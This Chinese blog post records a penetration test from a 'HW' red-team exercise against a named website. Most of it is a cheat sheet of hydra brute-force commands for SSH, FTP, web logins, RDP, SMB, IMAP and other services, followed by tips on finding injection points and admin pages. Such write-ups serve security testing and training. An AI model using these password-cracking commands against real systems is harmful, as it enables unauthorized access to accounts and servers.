---
title: 参加HW项目的一次渗透测试
date: 2020/10/24 15:23:21
ayout: kali3
permalink: kali3.html
cover:
---
用前段时间的HW行动写一篇记录
<!--more-->
首先信息收集

站点URL:http://www.jxsfybjyy.cn/

1. 先拿URL通过nslookup命令查找ip


2. 拿到ip后，用nmap扫一波端口


3. 扫一波后，发现有端口暴露，找找敏感端口（特殊服务端口21，22）爆破走一波

爆破 ssh:22 端口命令：

    hydra -L users.txt -P password.txt -t 5 -vV -o ssh.txt -e ns 192.168.0.132 ssh

爆破 Ftp:21 端口命令(指定用户名为root)：

    hydra -l root -P password.txt -t 5 -vV -o ftp.txt -e ns 192.168.0.132 ftp

get方式提交，破解web登录(指定用户名为admin)：

    hydra -L user.txt -p password.txt -t 线程 -vV -e ns ip http-get /admin/
    hydra -l admin -p password.txt -t 线程 -vV -e ns -f ip http-get /admin/index.php

post方式提交，破解web登录：

    hydra -l admin -P password.txt -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
    hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"

参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解，<title>中的内容是表示错误猜解的返回信息提示。

破解https：

    hydra -m /index.php -l admin -P password.txt 192.168.0.132 https

破解teamspeak：

    hydra -l admin -P passworrd.txt -s 端口号 -vV 192.168.0.132 teamspeak

破解cisco：

    hydra -P password.txt 192.168.0.132 cisco
    hydra -m cloud -P password.txt 192.168.0.132 cisco-enable

破解smb：

    hydra -l administrator -P password.txt 192.168.0.132 smb

破解pop3：

    hydra -l root -P password.txt my.pop3.mail pop3

破解rdp(3389端口)：

    hydra -l administrator -P password.txt -V 192.168.0.132 rdp

破解http-proxy：

    hydra -l admin -P passwprd.txt http-proxy://192.168.0.132

破解imap：

    hydra -L user.txt -p secret 192.168.0.132 imap PLAIN
    hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

4.再从主站查找信息，通过点击页面和链接寻找注入点,特别是跳转链接以及登录页面。

5.查找网站路径下的后台管理系统登录入口，一般为admin或者login路径8
